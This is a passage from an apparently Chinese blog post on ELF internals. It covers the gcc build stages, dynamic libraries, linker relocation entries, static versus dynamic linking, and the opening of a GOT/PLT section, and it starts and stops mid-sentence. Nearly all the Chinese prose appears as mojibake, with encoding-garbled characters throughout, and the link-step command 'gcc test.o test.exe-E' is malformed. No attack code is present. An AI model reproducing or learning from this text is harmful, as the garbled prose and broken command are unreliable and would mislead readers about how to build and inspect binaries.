#-Eæ˜¯è®©ç¼–è¯‘å™¨åœ¨é¢„å¤„ç†ä¹‹åå°±é€€å‡ºï¼Œä¸è¿›è¡Œåç»­ç¼–è¯‘è¿‡ç¨‹ï¼›-oæ˜¯æŒ‡å®šè¾“å‡ºæ–‡ä»¶åã€‚<br></code></pre></td></tr></table></figure><p>å¤„ç†åçš„test.iæ–‡ä»¶å°±ä¼šå˜å¾—å¾ˆé•¿å¾ˆé•¿ï¼Œä»¥ä¸‹æ˜¯éƒ¨åˆ†æˆªå›¾ï¼š</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-09-26.png"></p><h5 id="02-ç¼–è¯‘"><a href="#02-ç¼–è¯‘" class="headerlink" title="02 ç¼–è¯‘"></a>02 ç¼–è¯‘</h5><p>ä½¿ç”¨ç¼–è¯‘å™¨å°†é¢„å¤„ç†æ–‡ä»¶<code>test.i</code>ç¼–è¯‘æˆæ±‡ç¼–æ–‡ä»¶<code>test.s</code>ï¼Œå…¶ä¸­<code>test.s</code>æ˜¯æ–‡æœ¬æ–‡ä»¶ã€‚</p><p>gccå‘½ä»¤ä¸ºï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -S test.i -o test.s   #-Sè®©ç¼–è¯‘å™¨åœ¨ç¼–è¯‘ä¹‹ååœæ­¢ï¼Œä¸è¿›è¡Œåç»­è¿‡ç¨‹ï¼›-oæ˜¯æŒ‡å®šè¾“å‡ºæ–‡ä»¶å<br></code></pre></td></tr></table></figure><p>å¤„ç†åçš„test.sæ–‡ä»¶åˆå˜å¾—çŸ­çŸ­çš„äº†</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-19-27.png"></p><h5 id="03-ç¼–è¯‘"><a href="#03-ç¼–è¯‘" class="headerlink" title="03 ç¼–è¯‘"></a>03 ç¼–è¯‘</h5><p>ä½¿ç”¨æ±‡ç¼–å™¨å°†æ±‡ç¼–æ–‡ä»¶<code>test.s</code>è½¬æ¢æˆç›®æ ‡æ–‡ä»¶<code>test.o</code>ï¼Œå…¶ä¸­<code>test.o</code>æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><p>æ±‡ç¼–è¿‡ç¨‹çš„å‘½ä»¤ä¸ºï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -c test.s -o test.o   #-cè®©æ±‡ç¼–å™¨æŠŠæ±‡ç¼–æ–‡ä»¶test.sè½¬æ¢æˆç›®æ ‡æ–‡ä»¶test.oã€‚<br></code></pre></td></tr></table></figure><h5 id="04-é“¾æ¥"><a href="#04-é“¾æ¥" class="headerlink" title="04 é“¾æ¥"></a>04 é“¾æ¥</h5><p>é“¾æ¥è¿‡ç¨‹ä½¿ç”¨é“¾æ¥å™¨å°†è¯¥ç›®æ ‡æ–‡ä»¶ä¸å…¶ä»–ç›®æ ‡æ–‡ä»¶ã€åº“æ–‡ä»¶ã€å¯åŠ¨æ–‡ä»¶ç­‰é“¾æ¥èµ·æ¥ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>è¯¥æ­¥éª¤çš„å‘½ä»¤ä¸ºï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc test.o test.exe-E <br></code></pre></td></tr></table></figure><p>æ‹–è¿›IDAå°±æ˜¯æˆ‘ä»¬æ¯”è¾ƒç†Ÿæ‚‰çš„æ ·å­äº†</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-42-21.png"></p><h3 id="åŠ¨æ€é“¾æ¥åº“"><a href="#åŠ¨æ€é“¾æ¥åº“" class="headerlink" title="åŠ¨æ€é“¾æ¥åº“"></a>åŠ¨æ€é“¾æ¥åº“</h3><p>æˆ‘ä»¬åœ¨å†™ç¨‹åºçš„æ—¶å€™ï¼Œé€šå¸¸ä¸ä¼šå®Œå…¨é è‡ªå·±æ¥å®ç°æ‰€æœ‰åŠŸèƒ½ï¼Œæˆ‘ä»¬ä¼šè°ƒç”¨æˆ‘ä»¬æ‰€éœ€è¦çš„ç³»ç»Ÿåº“æˆ–è€…ç¬¬ä¸‰æ–¹åº“æ¥å®ç°æˆ‘ä»¬çš„åŠŸèƒ½ï¼Œè¿™äº›åº“å°±æ˜¯åŠ¨æ€é“¾æ¥åº“ã€‚</p><blockquote><p>åŠ¨æ€é“¾æ¥åº“å¯ä»¥æ˜ å°„åˆ°ä¸åŒè¿›ç¨‹çš„ä¸åŒè™šæ‹Ÿåœ°å€ï¼Œæ‰€ä»¥å±äºâ€œåœ°å€æ— å…³ä»£ç â€ã€‚</p></blockquote><p>ğŸŒ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> &#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>];<br>    <span class="hljs-built_in">strncpy</span>(buf, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, <span class="hljs-number">32</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¿™æ®µä»£ç ä¸­æˆ‘ä»¬è°ƒç”¨äº†ç³»ç»Ÿåº“ï¼Œåœ¨ç¼–è¯‘å®Œæˆåå¯ä»¥æŸ¥çœ‹æ–‡ä»¶çš„symbolã€‚ä¼šå‘ç°åœ¨printfå’Œstrncpyå‰é¢éƒ½æ˜¯æ²¡æœ‰å®šä¹‰çš„ï¼Œè¿™å°±æ˜¯ç”¨äºæ”¯æŒåŠ¨æ€è¿æ¥åŠŸèƒ½çš„ã€‚</p><blockquote><p>ä¸¤ç§å‘½ä»¤å¯ä»¥éšæ„æŒ‘é€‰ï¼Œä½†ç»“æœä¸å¤ªä¸€æ ·ï¼Œè¿˜æ²¡ææ˜ç™½ğŸ˜³</p><p><code>nm -g [filename]</code></p><p><code>readelf  -s [filename]</code></p></blockquote><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-10_18-30-06.png"></p><p>é€šè¿‡objdumpå‘½ä»¤æŸ¥çœ‹ç›¸å…³å‡½æ•°çš„åæ±‡ç¼–æ¨¡å— <code>objdump -D [filename]</code>ï¼ˆåœ¨.pltéƒ¨åˆ†ï¼‰</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-10_21-05-57.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºé¦–å…ˆè¿›è¡Œjupqæ“ä½œè·³è½¬åˆ°ç›¸åº”çš„ä»£ç æ®µï¼Œè¿™ä¸ªä»£ç æ®µå°±æ˜¯ç”¨äºç»™â€œåœ°å€æ— å…³ä»£ç â€åšåŠ¨æ€åœ°å€é‡å®šä½ï¼Œé“¾æ¥å™¨å°†è¿™ä¸ªå‡½æ•°çš„è°ƒç”¨ä»£ç è·³è½¬åˆ°ç¨‹åºè¿è¡Œæ—¶çš„åŠ¨æ€è£…è½½åœ°å€ã€‚</p><h3 id="é“¾æ¥å™¨"><a href="#é“¾æ¥å™¨" class="headerlink" title="é“¾æ¥å™¨"></a>é“¾æ¥å™¨</h3><p>é“¾æ¥å™¨ï¼ˆLinkerï¼‰æ˜¯ä¸€ä¸ªç¨‹åºï¼Œå°†ä¸€ä¸ªæˆ–å¤šä¸ªç”±ç¼–è¯‘å™¨æˆ–æ±‡ç¼–å™¨ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶å¤–åŠ åº“é“¾æ¥ä¸ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚ç›®æ ‡æ–‡ä»¶æ˜¯åŒ…æ‹¬æœºå™¨ç å’Œé“¾æ¥å™¨å¯ç”¨ä¿¡æ¯çš„ç¨‹åºæ¨¡å—ã€‚</p><p>ç®€å•çš„è®²ï¼Œ<strong>é“¾æ¥å™¨çš„å·¥ä½œå°±æ˜¯è§£ææœªå®šä¹‰çš„ç¬¦å·å¼•ç”¨ï¼Œå°†ç›®æ ‡æ–‡ä»¶ä¸­çš„å ä½ç¬¦æ›¿æ¢ä¸ºç¬¦å·çš„åœ°å€</strong>ã€‚</p><p>é“¾æ¥å™¨è¿˜è¦å®Œæˆç¨‹åºä¸­å„ç›®æ ‡æ–‡ä»¶çš„åœ°å€ç©ºé—´çš„ç»„ç»‡ï¼Œæ¶‰åŠé‡å®šä½å·¥ä½œã€‚</p><h5 id="é“¾æ¥å™¨çš„å·¥ä½œæ­¥éª¤"><a href="#é“¾æ¥å™¨çš„å·¥ä½œæ­¥éª¤" class="headerlink" title="é“¾æ¥å™¨çš„å·¥ä½œæ­¥éª¤"></a>é“¾æ¥å™¨çš„å·¥ä½œæ­¥éª¤</h5><ul><li>å°†ä»£ç å’Œæ•°æ®æ¨¡å—è±¡å¾æ€§åœ°æ”¾å…¥å†…å­˜</li><li>å†³å®šæ•°æ®å’ŒæŒ‡ä»¤æ ‡ç­¾çš„åœ°å€</li><li>ä¿®è¡¥å†…éƒ¨å’Œå¤–éƒ¨å¼•ç”¨</li></ul><h5 id="é“¾æ¥å™¨éœ€è¦å¯¹åŠ¨æ€é“¾æ¥åº“åšçš„æƒ…"><a href="#é“¾æ¥å™¨éœ€è¦å¯¹åŠ¨æ€é“¾æ¥åº“åšçš„æƒ…" class="headerlink" title="é“¾æ¥å™¨éœ€è¦å¯¹åŠ¨æ€é“¾æ¥åº“åšçš„æƒ…"></a>é“¾æ¥å™¨éœ€è¦å¯¹åŠ¨æ€é“¾æ¥åº“åšçš„æƒ…</h5><ul><li>é“¾æ¥åº“åœ¨å°†ç›®æ ‡æ–‡ä»¶é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶çš„çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°æŸä¸€ä¸ªå˜é‡æˆ–è€…å‡½æ•°åœ¨ç›®æ ‡ä¸­æ‰¾ä¸åˆ°ï¼Œå°±ä¼šæŒ‰ç…§ gcc é¢„å®šä¹‰çš„åŠ¨æ€åº“å¯»æ‰¾åŠ¨æ€åº“ä¸­å®šä¹‰çš„å˜é‡æˆ–è€…å‡½æ•°</li><li>å¦‚æœé“¾æ¥åº“åœ¨æŸä¸€åŠ¨æ€åº“ä¸­æ‰¾åˆ°äº†è¯¥å˜é‡æˆ–è€…å‡½æ•°çš„å®šä¹‰ï¼Œé“¾æ¥åº“é¦–å…ˆä¼šæŠŠè¿™ä¸ªåŠ¨æ€é“¾æ¥åº“å†™åˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„ä¾èµ–åº“ä¸­ï¼Œç„¶åç”Ÿæˆè¿™ä¸ªå½“å‰å˜é‡æˆ–è€…å‡½æ•°çš„ä»£ç†symbol</li><li>åœ¨åç§»è¡¨ä¸­ç”ŸæˆçœŸæ­£çš„åŠ¨æ€è·³è½¬æŒ‡ä»¤ï¼Œå¹¶ä¸”åœ¨åº“å‡½æ•°ä»£ç†symbolä¸­è·³è½¬åˆ°ç›¸åº”çš„åç§»ä½ç½®</li></ul><h3 id="é‡å®šä½"><a href="#é‡å®šä½" class="headerlink" title="é‡å®šä½"></a>é‡å®šä½</h3><p>é‡å®šä½ï¼ˆRelocationsï¼‰å°±æ˜¯æŠŠç¨‹åºçš„é€»è¾‘åœ°å€å˜æ¢æˆä¸ºå†…å­˜ä¸­çš„å®é™…åœ°å€ç©ºé—´çš„è¿‡ç¨‹ã€‚</p><p>é‡å®šä½åˆ†ä¸ºä¸¤æ­¥ï¼š</p><ul><li>é‡å®šä½èŠ‚å’Œç¬¦å·å¼•ç”¨</li></ul><p>åœ¨è¿™ä¸€æ­¥ä¸­ï¼Œè¿æ¥å™¨å°†æ‰€æœ‰ç›¸åŒç±»å‹çš„èŠ‚åˆå¹¶ä¸ºåŒä¸€ç±»å‹çš„æ–°èšèŠ‚ã€‚éšåé“¾æ¥å™¨æŠŠè¿è¡Œæ—¶çš„å†…å­˜èµ‹å€¼ç»™æ–°çš„èšåˆèŠ‚ï¼Œèµ‹ç»™è¾“å…¥æ¨¡å—å®šä¹‰çš„æ¯ä¸ªèŠ‚ï¼Œä»¥åŠèµ‹ç»™è¾“å…¥æ¨¡å—çš„æ¯ä¸ªç¬¦å·ã€‚</p><blockquote><p>e.g.æ‰€æœ‰è¾“å…¥æ¨¡å—çš„.dataèŠ‚è¢«åˆå¹¶ä¸ºä¸€ä¸ªèŠ‚ï¼Œè¿™ä¸ªèŠ‚æˆä¸ºè¾“å…¥çš„å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶çš„.dataèŠ‚ã€‚</p></blockquote><p>å½“è¿™ä¸€æ­¥å®Œæˆï¼Œç¨‹åºä¸­çš„æ¯æ¡æŒ‡ä»¤å’Œå…¨å±€å˜é‡éƒ½æœ‰å”¯ä¸€çš„è¿è¡Œæ—¶çš„å†…å­˜åœ°å€äº†ã€‚</p><ul><li>é‡å®šä½èŠ‚ä¸­çš„ç¬¦å·å¼•ç”¨</li></ul><p>åœ¨è¿™ä¸€æ­¥ä¸­ï¼Œé“¾æ¥å™¨ä¿®æ”¹ä»£ç èŠ‚å’Œæ•°æ®èŠ‚ä¸­å¯¹æ¯ä¸ªç¬¦å·çš„å¼•ç”¨ï¼Œä½¿å¾—ä»–ä»¬æŒ‡å‘æ­£ç¡®çš„è¿è¡Œåœ°å€ã€‚</p><p>å…¶ä¸­ï¼Œé“¾æ¥å™¨æ‰§è¡Œè¿™ä¸€æ­¥éœ€è¦ä¾é å¯é‡å®šä½ç›®æ ‡æ¨¡å—ä¸­æˆä¸º<strong>é‡å®šä½æ¡ç›®</strong>çš„æ•°æ®ç»“æ„ã€‚</p><h5 id="é‡å®šä½æ¡ç›®"><a href="#é‡å®šä½æ¡ç›®" class="headerlink" title="é‡å®šä½æ¡ç›®"></a>é‡å®šä½æ¡ç›®</h5><p>å½“æ±‡ç¼–å™¨ç”Ÿæˆä¸€ä¸ªç›®æ ‡æ¨¡å—æ—¶ï¼Œä»–å¹¶ä¸çŸ¥é“æ•°æ®å’Œä»£ç æœ€ç»ˆä¼šè¢«æ”¾åœ¨å†…å­˜çš„é‚£ä¸ªä½ç½®ï¼Œä¹Ÿä¸çŸ¥é“è¿™ä¸ªæ¨¡å—å¼•ç”¨çš„å¤–éƒ¨å®šä¹‰çš„å‡½æ•°æˆ–è€…å…¨å±€å˜é‡çš„ä½ç½®ã€‚æ‰€ä»¥ï¼Œå½“æ±‡ç¼–å™¨é‡åˆ°ä¸€ä¸ªå¯¹æœ€ç»ˆä½ç½®æœªçŸ¥çš„ç›®æ ‡å¼•ç”¨ï¼Œå®ƒå°±ä¼šç”Ÿæˆä¸€ä¸ªé‡å®šä½æ¡ç›®ï¼Œå‘Šè¯‰è¿æ¥å™¨å°†ç›®æ ‡æ–‡ä»¶åˆå¹¶æˆå¯æ‰§è¡Œæ–‡ä»¶æ—¶å¦‚ä½•ä¿®æ”¹è¿™ä¸ªå¼•ç”¨ã€‚</p><p>ä»£ç çš„é‡å®šä½æ¡ç›®æ”¾åœ¨<code>.rel.text</code>ä¸­ï¼Œå·²ç»åˆå§‹åŒ–æ•°æ®çš„é‡å®šä½æ¡ç›®æ”¾åœ¨<code>.rel.data</code>ä¸­ã€‚</p><p>é‡å®šä½æ¡ç›®åˆ†ä¸ºä¸¤ç§æ ¼å¼ï¼š<code>Rel</code>å’Œ<code>Rela</code>ã€‚æ¯ä¸ªé‡å®šä½æ¡ç›®è¡¨ç¤ºä¸€ä¸ªå¿…é¡»è¢«é‡å®šä½çš„ç¬¦å·å¼•ç”¨ï¼Œå¹¶æŒ‡æ˜å¦‚ä½•è®¡ç®—è¢«ä¿®æ”¹çš„ç¬¦å·å¼•ç”¨ã€‚</p><blockquote><p>é‡å®šä½æ¡ç›®<code>Rel</code>å’Œ<code>Rela</code>ä¹‹é—´çš„å”¯ä¸€åŒºåˆ«ï¼š<code>Rel</code>ä¸­æ²¡æœ‰<code>Addend</code>å­—æ®µã€‚</p></blockquote><p>æŸ¥çœ‹æ–‡ä»¶ä¸­çš„é‡å®šä½ä¿¡æ¯ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">readelf -r [filename]<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-12_21-32-29.png"></p><ul><li><p><code>Offset</code>æ˜¯ Relocation Entry ç»“æ„ä½“ä¸­çš„ç¬¬ 1 ä¸ªå­—æ®µï¼Œå ç”¨ 8 å­—èŠ‚ï¼Œè¡¨ç¤º<strong>éœ€è¦ä¿®æ”¹çš„ç¬¦å·å¼•ç”¨çš„ä½ç½®</strong>ã€‚</p><ul><li><p>å¯¹äºå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼Œè¯¥å­—æ®µè¡¨ç¤ºéœ€è¦ä¿®æ”¹çš„ç¬¦å·å¼•ç”¨çš„èµ·å§‹ä½ç½®åœ¨ç›®æ ‡ section ï¼ˆ<code>.rela.text</code>ä¸­çš„é‡å®šä½æ¡ç›®å¯¹åº”çš„ç›®æ ‡ section ä¸º<code>.text</code>ï¼Œ<code>.rela.data</code>ä¸­çš„é‡å®šä½æ¡ç›®å¯¹åº”çš„ç›®æ ‡ section ä¸º<code>.data</code>ï¼Œä»¥æ­¤ç±»æ¨ï¼‰ä¸­çš„åç§»é‡ï¼ˆå­—èŠ‚ï¼‰ã€‚</p></li><li><p>å¯¹äºå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶å’Œå¯å…±äº«ç›®æ ‡æ–‡ä»¶ï¼Œè¯¥å­—æ®µè¡¨ç¤ºéœ€è¦ä¿®æ”¹çš„ç¬¦å·å¼•ç”¨çš„èµ·å§‹ä½ç½®æ‰€å¯¹åº”çš„è™šæ‹Ÿå†…å­˜åœ°å€ã€‚</p></li></ul></li><li><p><code>Info</code>æ˜¯ Relocation Entry ç»“æ„ä½“ä¸­çš„ç¬¬ 2 ä¸ªå­—æ®µï¼Œå ç”¨ 8 å­—èŠ‚ï¼Œè¡¨ç¤º<strong>ç¬¦å·è¡¨ç´¢å¼•å’Œé‡å®šä½ç±»å‹</strong>ï¼ˆç¬¦å·è¡¨ç´¢å¼•å ç”¨é«˜ 32 ä½ï¼Œé‡å®šä½ç±»å‹å ç”¨ä½ 32 ä½ï¼‰ã€‚</p><ul><li><p>ç¬¦å·è¡¨ç´¢å¼•è¡¨ç¤ºéœ€è¦ä¿®æ”¹çš„ç¬¦å·å¼•ç”¨åœ¨<code>.symtab</code>sectionä¸­çš„ç´¢å¼•ã€‚è¿™é‡Œçš„<code>Sym. Value</code>å’Œ<code>Sym. Name</code>åˆ—åªæ˜¯æ‰“å°äº†æ‰€å¯¹åº”ç¬¦å·è¡¨æ¡ç›®ä¸­<code>Value</code>å’Œ<code>Name</code>åˆ—çš„å€¼ã€‚</p></li><li><p>é‡å®šä½ç±»å‹æŒ‡ç¤ºé“¾æ¥å™¨å¦‚ä½•ä¿®æ”¹è¯¥ç¬¦å·å¼•ç”¨çš„å€¼ã€‚é‡å®šä½ç±»å‹å› ä¸åŒçš„å¤„ç†å™¨è€Œå¼‚ã€‚</p></li></ul></li><li><p><code>Addend</code>æ˜¯ Relocation Entry ç»“æ„ä½“ä¸­çš„ç¬¬ 3 ä¸ªå­—æ®µï¼Œå ç”¨ 8 å­—èŠ‚ï¼Œè¡¨ç¤ºä¸€ä¸ªæœ‰ç¬¦å·å¸¸æ•°ï¼Œä¸€äº›é‡å®šä½ç±»å‹è¦ä½¿ç”¨å®ƒå¯¹è¢«ä¿®æ”¹ç¬¦å·å¼•ç”¨çš„å€¼åš<strong>åç§»è°ƒæ•´</strong>ã€‚</p></li></ul><h1 id="é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥"><a href="#é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥" class="headerlink" title="é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥"></a>é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥</h1><h4 id="é™æ€é“¾æ¥"><a href="#é™æ€é“¾æ¥" class="headerlink" title="é™æ€é“¾æ¥"></a>é™æ€é“¾æ¥</h4><blockquote><p>é™æ€é“¾æ¥æ˜¯ç”±é“¾æ¥å™¨åœ¨é“¾æ¥æ—¶å°†åº“çš„å†…å®¹åŠ å…¥åˆ°å¯æ‰§è¡Œç¨‹åºä¸­çš„åšæ³•ã€‚é“¾æ¥å™¨æ˜¯ä¸€ä¸ªç‹¬ç«‹ç¨‹åºï¼Œå°†ä¸€ä¸ªæˆ–å¤šä¸ªåº“æˆ–ç›®æ ‡æ–‡ä»¶ï¼ˆå…ˆå‰ç”±ç¼–è¯‘å™¨æˆ–æ±‡ç¼–å™¨ç”Ÿæˆé“¾æ¥åˆ°ä¸€å—ç”Ÿæˆå¯æ‰§è¡Œç¨‹åºã€‚è¿™é‡Œçš„åº“æŒ‡çš„æ˜¯é™æ€é“¾æ¥åº“ï¼ŒWindowsä¸‹ä»¥<code>.lib</code>ä¸ºåç¼€ï¼ŒLinuxä¸‹ä»¥<code>.a</code>ä¸ºåç¼€ã€‚</p></blockquote><p>è‹¥ç¨‹åºä½¿ç”¨é™æ€é“¾æ¥æ–¹å¼ï¼Œåˆ™ç¨‹åºæ‰€æœ‰ä»£ç éƒ½å°†é›†æˆåˆ°åŒä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œå…¶ä¼˜ç‚¹åœ¨äºæ— ä¾èµ–å…³ç³»ï¼Œå¯ä»¥åœ¨ä¸åŒè¿è¡Œç¯å¢ƒçš„OSä¸‹è¿è¡Œã€‚</p><p>ä½†æ˜¯ç¼ºç‚¹ä¹Ÿååˆ†æ˜æ˜¾ï¼Œç”±äºäºŒè¿›åˆ¶æ–‡ä»¶ä¸­åŒ…å«å…¨éƒ¨ä»£ç ï¼Œæ‰€ä»¥æ‰€å ç©ºé—´è¾ƒå¤§ï¼›å¦‚æœå¤šæ¬¡è¿è¡ŒåŒä¸€ä¸ªç¨‹åºï¼Œåˆ™OSå¯èƒ½ä¼šå¯¹æŸä¸ªåº“å‡½æ•°è¿›è¡Œå¤šæ¬¡é‡å¤ çš„åŠ è½½ï¼Œå ç”¨äº†ä¸å¿…è¦çš„å†…å­˜ï¼›è‹¥æŸä¸ªå…¬ç”¨çš„åº“å‡½æ•°äº§ç”Ÿäº†æ›´æ–°ï¼Œåˆ™éœ€è¦é‡æ–°ç¼–è¯‘æ‰€æœ‰ä½¿ç”¨äº†è¯¥åº“çš„ç¨‹åºï¼Œå·¥ä½œé‡è¾ƒå¤§ã€‚</p><h5 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h5><ul><li>ä»£ç è£…è½½é€Ÿåº¦å¿«ï¼Œæ‰§è¡Œé€Ÿåº¦ç•¥æ¯”åŠ¨æ€é“¾æ¥åº“å¿«ï¼›</li><li>åªéœ€ä¿è¯åœ¨å¼€å‘è€…çš„è®¡ç®—æœºä¸­æœ‰æ­£ç¡®çš„.libæ–‡ä»¶ï¼Œåœ¨ä»¥äºŒè¿›åˆ¶å½¢å¼å‘å¸ƒç¨‹åºæ—¶ä¸éœ€è€ƒè™‘åœ¨ç”¨æˆ·çš„è®¡ç®—æœºä¸Š.libæ–‡ä»¶æ˜¯å¦å­˜åœ¨åŠç‰ˆæœ¬é—®é¢˜ã€‚</li></ul><h5 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h5><ul><li>ä½¿ç”¨é™æ€é“¾æ¥ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ä½“ç§¯è¾ƒå¤§ï¼ŒåŒ…å«ä¸€äº›é‡å¤ç›¸åŒçš„ä»£ç ï¼Œé€ æˆå†…å­˜ç©ºé—´çš„æµªè´¹ã€‚</li></ul><h4 id="åŠ¨æ€é“¾æ¥"><a href="#åŠ¨æ€é“¾æ¥" class="headerlink" title="åŠ¨æ€é“¾æ¥"></a>åŠ¨æ€é“¾æ¥</h4><p>åŠ¨æ€é“¾æ¥ï¼ˆDynamic Linkingï¼‰ï¼ŒæŠŠé“¾æ¥è¿™ä¸ªè¿‡ç¨‹æ¨è¿Ÿåˆ°äº†è¿è¡Œæ—¶å†è¿›è¡Œï¼Œåœ¨å¯æ‰§è¡Œæ–‡ä»¶è£…è½½æ—¶æˆ–è¿è¡Œæ—¶ï¼Œç”±æ“ä½œç³»ç»Ÿçš„è£…è½½ç¨‹åºåŠ è½½åº“ã€‚è¿™é‡Œçš„åº“æŒ‡çš„æ˜¯åŠ¨æ€é“¾æ¥åº“ï¼ŒWindowsä¸‹ä»¥<code>.dll</code>ä¸ºåç¼€ï¼ŒLinuxä¸‹ä»¥<code>.so</code>ä¸ºåç¼€ã€‚</p><p>åœ¨Windowsä¸‹çš„åŠ¨æ€é“¾æ¥ä¹Ÿå¯ä»¥ç”¨åˆ°.libä¸ºåç¼€çš„æ–‡ä»¶ï¼Œä½†è¿™é‡Œçš„<code>.lib</code>æ–‡ä»¶å«åšå¯¼å…¥åº“ï¼Œæ˜¯ç”±<code>.dll</code>æ–‡ä»¶ç”Ÿæˆçš„ã€‚</p><h5 id="ä¼˜ç‚¹-1"><a href="#ä¼˜ç‚¹-1" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h5><ul><li><p>ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶è¾ƒå°ï¼›</p></li><li><p>é€‚ç”¨äºå¤§è§„æ¨¡çš„è½¯ä»¶å¼€å‘ï¼Œä½¿å¼€å‘è¿‡ç¨‹ç›¸å¯¹ç‹¬ç«‹ï¼Œè€¦åˆåº¦å‡å°ï¼Œä¾¿äºä¸åŒçš„å¼€å‘è€…å’Œå¼€å‘ç»„ç»‡ä¹‹é—´è¿›è¡Œå¼€å‘å’Œæµ‹è¯•ï¼›</p></li><li><p>ä¸åŒç¼–ç¨‹è¯­è¨€ç¼–å†™çš„ç¨‹åºåªè¦æŒ‰ç…§å‡½æ•°è°ƒç”¨çº¦å®šå°±å¯ä»¥è°ƒç”¨åŒä¸€ä¸ªDLLå‡½æ•°ï¼›</p></li><li><p>DLLæ–‡ä»¶ä¸EXEæ–‡ä»¶ç‹¬ç«‹ï¼Œåªè¦è¾“å‡ºæ¥å£ä¸å˜ï¼ˆå³åç§°ã€å‚æ•°ã€è¿”å›å€¼ç±»å‹å’Œè°ƒç”¨çº¦å®šä¸å˜ï¼‰ï¼Œæ›´æ¢DLLæ–‡ä»¶ä¸ä¼šå¯¹EXEæ–‡ä»¶é€ æˆä»»ä½•å½±å“ï¼Œå› è€Œæå¤§åœ°æé«˜äº†å¯ç»´æŠ¤æ€§å’Œå¯æ‰©å±•æ€§</p></li></ul><h5 id="ç¼ºç‚¹-1"><a href="#ç¼ºç‚¹-1" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h5><ul><li>ä½¿ç”¨åŠ¨æ€é“¾æ¥åº“çš„åº”ç”¨ç¨‹åºä¸æ˜¯è‡ªå®Œå¤‡çš„ï¼Œå®ƒä¾èµ–çš„DLLæ¨¡å—ä¹Ÿè¦å­˜åœ¨ï¼Œå¦‚æœä½¿ç”¨è½½å…¥æ—¶åŠ¨æ€é“¾æ¥ï¼Œç¨‹åºå¯åŠ¨æ—¶å‘ç°DLLä¸å­˜åœ¨ï¼Œç³»ç»Ÿå°†ç»ˆæ­¢ç¨‹åºå¹¶ç»™å‡ºé”™è¯¯ä¿¡æ¯ï¼›</li><li>é€Ÿåº¦æ¯”é™æ€é“¾æ¥æ…¢</li></ul><h1 id="GOTä¸PLT"><a href="#GOTä¸PLT" class="headerlink" title="GOTä¸PLT"></a>GOTä¸PLT</h1><p>ä¸ºäº†æ”¯æŒåŠ¨æ€é“¾æ¥è¿™ä¸€å·¥ä½œè¿‡ç¨‹ï¼Œåœ¨<code>.elf</code>æ–‡ä»¶ä¸­æœ‰å››ä¸ªsectionä¸ä¹‹ç›¸å…³ï¼š</p><ul><li><code>.got</code> ï¼šå…¨å±€åç§»è¡¨ï¼ˆGlobal Offset 